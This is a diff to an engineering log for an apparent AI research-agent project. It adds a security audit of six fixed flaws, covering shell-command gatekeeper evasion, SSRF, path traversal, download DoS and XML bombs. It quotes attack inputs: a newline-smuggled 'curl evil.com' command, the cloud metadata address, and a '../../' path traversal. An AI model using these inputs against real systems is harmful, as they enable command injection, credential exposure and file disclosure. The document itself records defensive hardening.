@@ -36,6 +36,7 @@
 | **ADR-009** | Overnight Consolidation Patrol & Morning Intelligence Briefing | Autonomous Nightly Patrol + Gated Review Queue + Markdown Digest | Unchecked automated edge mutation, Destructive auto-deduping | Solves epistemic drift: AI never unilaterally resolves contradictions or merges aliases. All findings are staged as Tier B review proposals with explicit explanations, and synthesized into `vault/digests/digest_YYYY-MM-DD.md`. |
 | **ADR-010** | Unified Hybrid Retrieval with Reciprocal Rank Fusion (RRF) | Multi-Channel RRF ($k=60$) over Lexical (BM25), Dense Vector (HNSW), and Graph Traversal | Score-normalization (Min-Max / Softmax), Isolated retrieval calls | Eliminates fragmented search logic; avoids uncalibrated score scale collapse; parameter-free rank fusion guarantees robust ordering across disparate retrieval channels. |
 | **ADR-011** | Multi-Surface Deep Research & Anti-SEO Graph Exploration | Query De-Optimization + Multi-Source Discovery (DuckDuckGo, Hacker News Algolia, Reddit, arXiv) + Recursive Semantic Citation Traversal ($d \ge 1$) + Prompt Injection Shielding | Commercial top-5 scraping alone, Unfiltered raw HTML ingestion | Escapes commercial SEO spam farms; uncovers buried practitioner debates and primary science; protects reasoning loop from indirect prompt injection; binds findings into Knowledge Graph and Obsidian Vault. |
+| **ADR-012** | Defense-in-Depth Security Hardening & Zero-Trust Crawling | Line-aware AST Lexer + SSRFGuard (IP/DNS/Redirect Gating) + Stream Ceilings (25MB) + DefusedXML + Vault Path Traversal Invariants | Naive regex-only matching, Unchecked HTTP redirects, Trusting local paths | Neutralizes multi-line shell injection delimiter evasion, eliminates SSRF/cloud metadata leaks, prevents memory exhaustion DoS, prevents XML entity expansion, and strictly confines note generation within vault root. |
 
 ---
 
@@ -294,6 +295,33 @@
   - `apps/lumen-core/tests/test_content_extractor.py`: 5 passed in **0.47s** (injection shield, beacon neutralization, HTML cleaning, MarkItDown).
   - `apps/lumen-core/tests/test_deep_research_agent.py`: 3 passed in **0.14s** (end-to-end research loop, cooperative cancellation, vault dossier export).
   - Monorepo test suite: **63/63 automated tests green (100%)** (47 `lumen-core`, 16 `memory-engine`).
+
+---
+
+### Codebase Security Audit & Vulnerability Hardening (Zero-Trust Guardrails)
+- **Technique:** Multi-Vector Vulnerability Penetration & Hardening Audit.
+- **Identified & Neutralized Vulnerabilities:**
+  1. **Command Injection & Delimiter Evasion via Newline (`\n`) in `ASTGatekeeper` (`gatekeeper.py`):**
+     - *Flaw:* `shlex` with `whitespace_split=True` treated `\n` as whitespace. A compound command like `echo hi\ncurl evil.com` was masked as a single `echo` command (classified as SAFE), which then executed `curl` via subshell!
+     - *Fix:* `_split_into_segments` now splits by lines (`raw.splitlines()`) first and recursively evaluates every line and pipeline segment independently.
+  2. **Server-Side Request Forgery (SSRF) & Cloud Metadata Exfiltration (`extractor.py`):**
+     - *Flaw:* Crawler fetched arbitrary URLs and followed redirects into internal network interfaces (`localhost:5432`, `127.0.0.1:8000`, `169.254.169.254` AWS/GCP metadata).
+     - *Fix:* Built `SSRFGuard` performing strict scheme verification (`http`/`https`), DNS resolution checks (`socket.getaddrinfo`), and blocking all private, loopback, link-local, multicast, and metadata IPs with redirect hop validation.
+  3. **Path Traversal & Arbitrary File Disclosure in `/dossier` (`session.py`):**
+     - *Flaw:* `/dossier ../../LUMEN_ENGINEERING_LOG` could read markdown files outside `vault/research/`.
+     - *Fix:* Path sanitization stripping directory separators, enforcing `target.resolve().is_relative_to(research_dir.resolve())`.
+  4. **Denial of Service via Unbounded Download Streams (`extractor.py`):**
+     - *Flaw:* Reading arbitrary file streams into memory without ceiling risked OOM crashes on large files or decomp bombs.
+     - *Fix:* Enforced a 25 MB stream ceiling (`MAX_DOWNLOAD_BYTES = 25 * 1024 * 1024`) with `Content-Length` pre-check and streaming accumulator bounds.
+  5. **XML External Entity (XXE) & Entity Expansion Bomb Defense (`arxiv.py`):**
+     - *Flaw:* Standard `xml.etree.ElementTree` is vulnerable to XML entity expansion bombs (Billion Laughs).
+     - *Fix:* Replaced with `defusedxml.ElementTree` to prevent entity expansion and external DTD attacks.
+  6. **Vault Note Path Confinement (`vault_sync.py`):**
+     - *Flaw:* Entity and note sanitization stripped slashes but allowed sequences of double dots `..`.
+     - *Fix:* Replaced `\.\.+` with underscores and added `_safe_vault_target` ensuring every write is strictly relative to `vault_path`.
+- **Verification & Test Results:**
+  - `apps/lumen-core/tests/test_security_audit.py`: 4 passing security regression tests in **0.26s**.
+  - Monorepo test suite: **67/67 automated tests green (100%)** (51 `lumen-core`, 16 `memory-engine`).
 
 ---
 
